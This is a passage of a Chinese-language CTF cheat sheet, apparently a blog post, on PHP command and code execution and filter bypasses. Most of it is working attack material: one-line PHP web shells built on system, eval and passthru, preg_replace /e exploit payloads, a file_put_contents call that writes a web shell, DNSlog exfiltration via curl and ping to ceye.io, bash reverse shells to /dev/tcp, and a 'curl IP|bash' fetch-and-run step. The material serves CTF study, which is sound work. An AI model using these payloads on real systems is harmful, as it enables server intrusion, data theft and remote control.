class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=$(<span class="built_in">date</span> -f /f* <span class="number">2</span>&gt;&amp;<span class="number">1</span>);<span class="built_in">echo</span> $a;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624135752621.png"></p><h3 id="报错读取"><a href="#报错读取" class="headerlink" title="报错读取"></a>报错读取</h3><p>linux里可以用点号执行shell脚本，同样，我们也可以用这种方法报错读取文件内容，前提是你的用户组有<strong>读取文件的权限</strong></p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=$(. /f* <span class="number">2</span>&gt;&amp;<span class="number">1</span>);<span class="built_in">echo</span> $a;   #a<span class="variable">%3D%</span><span class="number">24</span>(.<span class="variable">%20%</span><span class="number">2</span>Ff*<span class="variable">%202%</span><span class="number">3</span>E<span class="variable">%261)%</span><span class="number">3</span>Becho<span class="variable">%20%</span><span class="number">24</span>a%<span class="number">3</span>B</span><br></pre></td></tr></table></figure></div><p>如果你的用户组有<strong>执行文件的权限</strong><del>（但是通常没有）</del>，你可以直接&#x2F;f*获得文件内容：</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=$(/f* <span class="number">2</span>&gt;&amp;<span class="number">1</span>);<span class="built_in">echo</span> $a;  #a<span class="variable">%3D%</span><span class="number">24</span>(<span class="variable">%2Ff*%</span><span class="number">202</span><span class="variable">%3E%</span><span class="number">261</span>)<span class="variable">%3Becho%</span><span class="number">20</span><span class="variable">%24a%</span><span class="number">3</span>B</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624152216428.png"></p><h3 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h3><p>用于比较文件的内容，我们可以把想读取的文件内容和一个已知的文件进行比较，获得差集也就是我们想要的内容了，如：</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff /f* /etc/passwd</span><br></pre></td></tr></table></figure></div><p>不需要完整文件名</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624152237710.png"></p><h2 id="系统命令执行函数"><a href="#系统命令执行函数" class="headerlink" title="系统命令执行函数"></a>系统命令执行函数</h2><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><p>&#x3D;&#x3D;作用&#x3D;&#x3D;：同 C 版本的 <strong>system()</strong> 函数一样，本函数执行<code>command</code> 参数所指定的命令，<strong>&#x3D;&#x3D;并且输出执行结果&#x3D;&#x3D;</strong>。如果 PHP 运行在服务器模块中，<strong>system()</strong> 函数还会尝试在每行输出完毕之后，自动刷新 web 服务器的输出缓存。如果 PHP 运行在服务器模块中，<strong>system()</strong> 函数还会尝试在每行输出完毕之后，自动刷新 web 服务器的输出缓存。</p><p>&#x3D;&#x3D;示例&#x3D;&#x3D;：</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624154459017.png"></p><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><p>&#x3D;&#x3D;作用&#x3D;&#x3D;：执行外部程序**&#x3D;&#x3D;并且显示原始输出&#x3D;&#x3D;**。同 <strong>exec()</strong> 函数类似， <strong>passthru()</strong> 函数 也是用来执行外部命令（<code>command</code>）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 <a class="link" target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.exec.php">exec()<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 或 <a class="link" target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.system.php">system()<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 <code>image/gif</code>， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</p><p>&#x3D;&#x3D;示例&#x3D;&#x3D;：</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624154923811.png"></p><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p>&#x3D;&#x3D;作用&#x3D;&#x3D;：执行一个外部程序。<strong>exec()</strong> 执行 <code>command</code> 参数所指定的命令。返回命令执行结果的最后一行内容。（言外之意就是不显示，就算使用echo输出也是输出最后一行）</p><p>&#x3D;&#x3D;示例&#x3D;&#x3D;：</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624155317700.png"></p><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><p>&#x3D;&#x3D;作用&#x3D;&#x3D;：通过 shell 执行命令并将完整的输出以字符串的方式返回（依旧不显示，需要echo输出）</p><p>&#x3D;&#x3D;示例&#x3D;&#x3D;：</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624155618846.png"></p><h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h3><p>&#x3D;&#x3D;作用&#x3D;&#x3D;：在当前进程空间执行指定程序。以给定参数执行程序。经常用于<strong>disable_functions</strong>绕过，后面单开文章</p><h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h3><p>&#x3D;&#x3D;作用&#x3D;&#x3D;：打开进程文件指针。打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。</p><p>&#x3D;&#x3D;用法&#x3D;&#x3D;</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">popen</span>(<span class="string">&quot;ls &gt; ./1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624162507258.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624162521550.png"></p><h3 id="反引号"><a href="#反引号" class="headerlink" title="反引号&#96;&#96;"></a>反引号&#96;&#96;</h3><p>&#x3D;&#x3D;作用&#x3D;&#x3D;：PHP 支持一个执行运算符：反引号。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符“&#96;”的效果与函数<strong>shell_exec</strong>相同。</p><p>&#x3D;&#x3D;用法&#x3D;&#x3D;：</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> `ls`</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624163703336.png"></p><h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>&#x3D;&#x3D;作用&#x3D;&#x3D;：把字符串作为PHP代码执行，把指定 <code>code</code> 作为 PHP 代码执行。正在执行的代码继承调用 <strong>eval()</strong> 所在行的<strong>变量作用域</strong>。该行中任何有效变量都可在执行的代码中读取和修改。但定义的所有函数和类都将在全局命名空间中定义。换句话说，编译器将执行的代码视为单独 <em><strong>included</strong></em>后的文件。<strong>代码执行的作用域是调用 <em>eval()</em> 处的作用域。因此，<em>eval()</em> 里任何的变量定义、修改，都会在函数结束后被保留。</strong></p><p>&#x3D;&#x3D;注意&#x3D;&#x3D;：eval是一个语言构造器而不是一个函数，不能被 <strong>可变函数</strong>调用。</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]); <span class="comment">#是可以的</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;eval&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="comment">#不行</span></span><br></pre></td></tr></table></figure></div><h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>&#x3D;&#x3D;作用&#x3D;&#x3D;：断言检测</p><p>&#x3D;&#x3D;注意&#x3D;&#x3D;：在 PHP 8.0.0 之前，如果 <code>assertion</code> 是 string，将解释为 PHP 代码，并通过 eval() 执行。这个字符串将作为第三个参数传递给回调函数。这种行为在 PHP 7.2.0 中<em>弃用</em>，并在 PHP 8.0.0 中<em>移除</em>。</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;assert&quot;</span></span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="comment">#在7之前可行，之后不行</span></span><br></pre></td></tr></table></figure></div><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><p>&#x3D;&#x3D;作用&#x3D;&#x3D;：把第一个参数作为回调函数调用，第一个参数 <code>callback</code> 是被调用的回调函数，其余参数是回调函数的参数。</p><p>&#x3D;&#x3D;用法&#x3D;&#x3D;：</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&quot;assert&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="comment">#在php7之前可以</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;ls&quot;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><p>&#x3D;&#x3D;作用&#x3D;&#x3D;：通过执行代码字符串创建动态函数，从传递的参数中创建动态参数，并返回它的唯一名字。此函数在内部执行 <strong>eval()</strong></p><p>&#x3D;&#x3D;注意&#x3D;&#x3D;：本函数已自 PHP 7.2.0 起被<em>废弃</em>，并自 PHP 8.0.0 起被<em>移除</em>。</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">	<span class="variable">$func</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#传参cmd=system(&quot;id&quot;);</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line">	<span class="variable">$b</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&quot;echo <span class="subst">$a</span>&quot;</span>);</span><br><span class="line">	<span class="variable">$b</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//post:func=phpinfo();</span></span><br></pre></td></tr></table></figure></div><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h3><p>&#x3D;&#x3D;作用&#x3D;&#x3D;：为数组的每个元素应用回调函数。<strong>array_map()</strong> 返回一个 array，包含将 array 的相应值作为回调的参数顺序调用 callback 后的结果（如果提供了更多数组，还会利用 arrays 传入）。callback 函数形参的数量必须匹配 <strong>array_map()</strong> 实参中数组的数量。多余的实参数组将会被忽略。如果提供的实参数组的数量不足，将抛出 ArgumentCountError。</p><p>&#x3D;&#x3D;用法&#x3D;&#x3D;：、</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line">    <span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line">    <span class="variable">$new_array</span>=<span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$new_array</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#get:system post:id</span></span><br></pre></td></tr></table></figure></div><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><p>&#x3D;&#x3D;作用&#x3D;&#x3D;： 执行一个正则表达式的搜索和替换</p><p>&#x3D;&#x3D;注意&#x3D;&#x3D;：函数使用&#x2F;e修饰符，则存在代码执行漏洞</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/test/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>],<span class="string">&quot;jutst test&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">正经题目可能为如下</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;卧槽，没shell我怎么玩，frank1q22让你寒假多学习学习！！！&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]); <span class="comment">//这就是最后一关啦，事不过三   </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;最后一关，你也不行啊老弟，再去修炼修炼！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag is in /flag </span></span><br><span class="line"></span><br><span class="line">?a=/abc/e&amp;b=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>)&amp;c=abc</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">playload:\S*=$&#123;<span class="variable">$_POST</span>[pass]&#125;</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">pass=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h2 id="php函数直接读取文件"><a href="#php函数直接读取文件" class="headerlink" title="php函数直接读取文件"></a>php函数直接读取文件</h2><h3 id="各种函数"><a href="#各种函数" class="headerlink" title="各种函数"></a>各种函数</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">printf(`l\s /`);//反引号包裹当系统命令执行</span><br><span class="line">?&gt;&lt;?=`l\s /`;</span><br><span class="line"></span><br><span class="line">file_get_contents(&#x27;flag.php&#x27;)读取,</span><br><span class="line"></span><br><span class="line">highlight_file(&#x27;flag.php&#x27;)读，</span><br><span class="line"></span><br><span class="line">show_source(&#x27;flag.php&#x27;)读，</span><br><span class="line"></span><br><span class="line">rename(&#x27;flag.php&#x27;,&#x27;1.txt&#x27;)重命名后读</span><br><span class="line"></span><br><span class="line">var_dump(scandir(&#x27;/&#x27;)) 读取目录</span><br><span class="line"></span><br><span class="line">?c=eval(array_pop(next(get_defined_vars())))</span><br><span class="line">然后post传1=system(&quot;tac fla?.php&quot;);</span><br></pre></td></tr></table></figure></div><p><strong>php函数直接写shell</strong></p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(&#x27;2.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);</span><br></pre></td></tr></table></figure></div><h3 id="原生类读文件"><a href="#原生类读文件" class="headerlink" title="原生类读文件"></a>原生类读文件</h3><p>在禁用了大量函数，选择用 PHP 原生类 SplFileObject 进行文件读取。</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$f</span>=<span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>); <span class="keyword">while</span>(!<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">eof</span>())<span class="keyword">echo</span> <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">fgets</span>();</span><br></pre></td></tr></table></figure></div><p><strong>例题</strong>：DASCTF 2025上半年赛-web1 phpms</p><p>index.php</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x0a|\x0d/&#x27;</span>,<span class="variable">$shell</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;:(&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;#<span class="subst">$shell</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>使用<code>?&gt;&lt;?php system(&quot;ls&quot;);</code>发现被禁用了，且测试了许多函数发现都被禁用，使用使用<code>?&gt;&lt;?php $f=new SplFileObject(&#39;/etc/passwd&#39;); while(!$f-&gt;eof())echo $f-&gt;fgets();</code></p><h2 id="无回显绕过"><a href="#无回显绕过" class="headerlink" title="无回显绕过"></a>无回显绕过</h2><h3 id="shell-exec等无回显函数"><a href="#shell-exec等无回显函数" class="headerlink" title="shell_exec等无回显函数"></a>shell_exec等无回显函数</h3><h4 id="使用写入文件绕过"><a href="#使用写入文件绕过" class="headerlink" title="使用写入文件绕过"></a>使用写入文件绕过</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls |tee 1.txt //然后访问1.txt查看结果</span><br></pre></td></tr></table></figure></div><h4 id="DNSlog外带数据"><a href="#DNSlog外带数据" class="headerlink" title="DNSlog外带数据"></a>DNSlog外带数据</h4><p>利用网站平台：<a class="link" target="_blank" rel="noopener" href="http://ceye.io/records/dns">http://ceye.io/records/dns<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>利用curl发起http请求，或者ping时，网站解析DNS的过程中执行whoami（打个比方，此处为我们的payload）我们将在平台上看到whoami的执行结果</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://haha.xxx.ceye.io/`whoami`</span><br><span class="line">ping `whoami`.xxxx.ceye.io</span><br></pre></td></tr></table></figure></div><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>具体命令如下</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.xx/2333 0&gt;&amp;1</span><br><span class="line">bash -c &quot;bash -i &gt;&amp;/dev/tcp/47.xxx.xxx.xx/7777 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure></div><p>攻击机开启本地监听：</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure></div><h4 id="Curl配合Bash反弹shell"><a href="#Curl配合Bash反弹shell" class="headerlink" title="Curl配合Bash反弹shell"></a>Curl配合Bash反弹shell</h4><p>这里操作也很简单，借助了Linux中的管道。</p><p>首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure></div><p>并开启2333端口的监听。</p><p>然后再目标机上执行如下，即可反弹shell：</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 47.xxx.xxx.72|bash</span><br></pre></td></tr></table></figure></div><p>Curl配合Bash反弹shell的方式在CTF题目中经常出现，<code>curl IP|bash</code> 中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。</p><h3 id="dev-null-2-1类无回显"><a href="#dev-null-2-1类无回显" class="headerlink" title="&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1类无回显"></a><strong>&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1类无回显</strong></h3><p>用分隔符进行分割即可绕过</p><p><code>whoami&amp;&amp;ls</code>或<code>whoami||ls</code>拼接将后面ls输出到&#x2F;dev&#x2F;null而不影响前面命令</p><p><code>&amp;</code>是<code>%09</code>，<code>|</code>是<code>%7c</code></p><h2 id="使用-GET-将恶意命令带出"><a href="#使用-GET-将恶意命令带出" class="headerlink" title="使用$_GET[]将恶意命令带出"></a>使用$_GET[]将恶意命令带出</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_GET[1]);&amp;1=phpinfo();</span><br><span class="line">?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line">其他伪协议</span><br><span class="line">data://text/plain,&lt;?php system(&quot;mv fla* 1.txt&quot;)&gt;然后读1.txt`</span><br></pre></td></tr></table></figure></div><h2 id="无数字字母"><a href="#无数字字母" class="headerlink" title="无数字字母"></a>无数字字母</h2><p>贴一个用于检查可用字符的脚本</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">32</span>;<span class="variable">$i</span>&lt;<span class="number">127</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;</span>,<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&quot; 